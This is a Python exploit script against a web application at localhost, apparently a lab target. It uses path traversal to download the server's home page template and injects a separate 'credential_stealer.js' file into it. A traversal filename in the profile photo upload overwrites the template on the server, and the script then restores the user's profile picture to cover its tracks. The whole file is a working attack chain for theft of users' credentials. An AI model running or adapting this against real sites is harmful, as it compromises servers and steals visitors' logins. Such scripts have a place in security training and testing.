import requests
from bs4 import BeautifulSoup


BASE_URL = "http://localhost:5001"
LOGIN_ROUTE = BASE_URL+"/login"
HOME_ROUTE = BASE_URL+"/home"
PROFILE_ROUTE = BASE_URL+"/profile"
PHOTO_ROUTE = BASE_URL+"/get_photo"


def choose(preamble: str, options: list[str]) -> str:
    choice = float('inf')
    while choice <= 0 or choice > len(options):
        print(f"[i] {preamble}:")
        for i, option in enumerate(options):
            print(f"\t[{i+1}] {option}")
        try:
            choice = int(input("[?] Type a number: "))
        except ValueError:
            choice = float('inf')
    return options[choice-1]


def assert_ok(resp: requests.Response, summary: str):
    if not resp.ok:
        print(f"[-] {summary} failed with status code {resp.status_code}. Exiting...")
        exit(1)


session = requests.Session()
auth_method = choose("Sign-in options", ["Username / password sign-in", "Session cookie auth"])
if auth_method == "Username / password sign-in":
    username = input("[?] Enter your username: ")
    password = input("[?] Enter your password: ")
    login_page = BeautifulSoup(session.get(LOGIN_ROUTE).content, "html.parser")
    csrf_token = login_page.find("input", {"name": "csrf_token"})["value"]
    login_req = session.post(LOGIN_ROUTE, data={"username": username, "password": password, "csrf_token": csrf_token,
                                                "next": "/"})
    assert_ok(login_req, "Login")
    home_feed = BeautifulSoup(login_req.content, "html.parser")
elif auth_method == "Session cookie auth":
    session_cookie = input("[?] Paste your session cookie: ")
    session.cookies['session'] = session_cookie
    home_feed_req = session.get(HOME_ROUTE, allow_redirects=False)
    if home_feed_req.status_code == 200:
        home_feed = BeautifulSoup(home_feed_req.content, "html.parser")
    else:
        print(f"[-] Login failed with status code {home_feed_req.status_code}. Exiting...")
        exit(1)
else:
    print(f"[-] Unknown authentication method: {auth_method}")
    exit(1)

current_username = home_feed.select_one('header > .post-username').text
print(f"[+] Logged in as {current_username}.")

print("[i] Backing up current profile picture...")
pfp_route = home_feed.select_one(".profile-picture")["src"]
pfp_name = pfp_route.split("=")[-1]
pfp_bytes = session.get(BASE_URL+pfp_route).content

print("[i] Exfiltrating home page template...")
template_download = session.get(PHOTO_ROUTE, params={"file": "../templates/index.html"})
assert_ok(template_download, "Template exfiltration")
template_bytes = template_download.content
template = BeautifulSoup(template_bytes, "html.parser")

print("[i] Injecting credential stealer code...")
script_tag = template.new_tag("script")
with open("credential_stealer.js", "r") as exploit_script:
    script_tag.string = exploit_script.read()
template.head.insert(-1, script_tag)

print("[i] Uploading modified template...")
current_display_name = home_feed.find("input", {"name": "display_name"})["value"]
template_upload = session.post(PROFILE_ROUTE, files=(("display_name", (None, current_display_name)),
                                                     ("photo", ("../templates/index.html", template.encode()))))
assert_ok(template_upload, "Template re-upload")

print("[i] Restoring original profile picture...")
pfp_upload = session.post(PROFILE_ROUTE, files=(("display_name", (None, current_display_name)),
                                                ("photo", (pfp_name, pfp_bytes))))
assert_ok(pfp_upload, "Profile picture restore")

print("[+] Done.")
